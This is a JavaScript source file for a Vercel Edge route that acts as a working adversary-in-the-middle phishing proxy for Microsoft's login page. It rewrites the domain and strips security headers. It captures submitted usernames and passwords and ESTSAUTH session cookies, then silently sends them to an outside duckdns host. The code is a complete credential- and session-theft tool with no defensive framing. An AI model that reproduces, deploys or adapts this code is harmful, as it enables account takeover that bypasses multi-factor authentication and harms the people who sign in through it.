export const runtime = 'edge';

// Configuration
const UPSTREAM = 'login.microsoftonline.com';
const UPSTREAM_PATH = '/';
const VERCEL_URL = 'https://vercelorisdns.duckdns.org/api/relay';
const BLOCKED_REGIONS = [];
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// ---- Exfiltration Functions ----
async function sendCredsToVercel(data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
  } catch (error) {
    // Intentionally silent
  }
}

async function exfiltrateCookiesFile(cookieText, ip) {
  try {
    const content = `IP: ${ip}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {
    // Intentionally silent
  }
}

async function handleProxy(request, pathSegments = []) {
  const url = new URL(request.url);
  
  // Get client info from Vercel headers (equivalent to Cloudflare headers)
  const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
  const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  // Blocking check
  if (BLOCKED_REGIONS.includes(region) || BLOCKED_IPS.includes(ipAddress)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Build URL like Cloudflare Worker does
  const url_hostname = url.hostname;
  const upstream_domain = UPSTREAM;
  
  // FIX: Create URL from request but explicitly clear the port
  const upstreamUrl = new URL(request.url);
  upstreamUrl.protocol = 'https:';
  upstreamUrl.hostname = upstream_domain; // Use hostname (no port) instead of host
  upstreamUrl.port = ''; // Explicitly clear port to prevent 8080 leak
  
  // Handle path
  if (upstreamUrl.pathname === '/') {
    upstreamUrl.pathname = UPSTREAM_PATH;
  } else {
    upstreamUrl.pathname = UPSTREAM_PATH + upstreamUrl.pathname;
  }

  console.log('Proxying to:', upstreamUrl.toString());

  const method = request.method;
  const request_headers = request.headers;
  
  // Build headers - copy all but let fetch set Host automatically
  const new_request_headers = new Headers(request_headers);
  
  // Remove original Host header to let fetch set it correctly based on URL
  new_request_headers.delete('Host');
  
  // Set Referer to the upstream domain
  new_request_headers.set('Referer', `https://${upstream_domain}`);

  // ---- Credentials capture for POST requests ----
  if (method === 'POST') {
    try {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split('&');
      let user, pass;
      for (const pair of keyValuePairs) {
        const [key, value] = pair.split('=');
        if (key === 'login') {
          user = decodeURIComponent(value.replace(/\+/g, ' '));
        }
        if (key === 'passwd') {
          pass = decodeURIComponent(value.replace(/\+/g, ' '));
        }
      }
      if (user && pass) {
        await sendCredsToVercel({ type: "creds", ip: ipAddress, user, pass });
      }
    } catch (error) {
      // Intentionally silent
    }
  }

  // ---- Proxy request with duplex option for Edge Runtime ----
  const hasBody = !["GET", "HEAD"].includes(method);
  
  try {
    let original_response = await fetch(upstreamUrl.toString(), {
      method: method,
      headers: new_request_headers,
      body: hasBody ? request.body : null,
      // CRITICAL: duplex is required when sending body in Edge Runtime
      ...(hasBody && { duplex: 'half' })
    });

    // Handle WebSocket upgrades
    let connection_upgrade = new_request_headers.get("Upgrade");
    if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
      return original_response;
    }

    // Process response
    let original_response_clone = original_response.clone();
    let response_headers = original_response.headers;
    let new_response_headers = new Headers(response_headers);
    let status = original_response.status;

    new_response_headers.set('access-control-allow-origin', '*');
    new_response_headers.set('access-control-allow-credentials', 'true');
    new_response_headers.delete('content-security-policy');
    new_response_headers.delete('content-security-policy-report-only');
    new_response_headers.delete('clear-site-data');

    // ---- Capture and exfil cookies as file ----
    let all_cookies = "";
    try {
      const originalCookies = (typeof new_response_headers.getAll === "function")
        ? new_response_headers.getAll("Set-Cookie")
        : (new_response_headers.get("Set-Cookie") ? [new_response_headers.get("Set-Cookie")] : []);
      all_cookies = originalCookies.join("; \n\n");
      originalCookies.forEach(originalCookie => {
        const modifiedCookie = originalCookie.replace(/login\.microsoftonline\.com/g, url_hostname);
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });
    } catch (error) {
      console.error(error);
    }

    // ---- Check for 2 of 3 OR 3 of 3 cookies ----
    const hasEstsAuth = all_cookies.includes('ESTSAUTH');
    const hasEstsAuthPersistent = all_cookies.includes('ESTSAUTHPERSISTENT');
    const hasEstsAuthLight = all_cookies.includes('ESTSAUTHLIGHT');
    
    const cookieCount = [hasEstsAuth, hasEstsAuthPersistent, hasEstsAuthLight].filter(Boolean).length;
    
    if (cookieCount >= 2) {
      await exfiltrateCookiesFile(all_cookies, ipAddress);
    }

    // ---- Body replacement for domain ----
    const content_type = new_response_headers.get('content-type');
    let original_text = null;
    if (content_type && /(text\/html|application\/javascript|application\/json)/i.test(content_type)) {
      let text = await original_response_clone.text();
      text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
      original_text = text;
    } else {
      original_text = original_response_clone.body;
    }

    const response = new Response(original_text, {
      status,
      headers: new_response_headers
    });

    return response;
    
  } catch (fetchError) {
    console.error('Fetch error details:', fetchError.message, fetchError.cause);
    return new Response(`Proxy fetch failed: ${fetchError.message}`, { status: 502 });
  }
}

// Export handlers for common HTTP methods
export async function GET(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function POST(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function PUT(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function DELETE(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function PATCH(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function OPTIONS(request, { params }) {
  return handleProxy(request, params.path || []);
}

export async function HEAD(request, { params }) {
  return handleProxy(request, params.path || []);
}
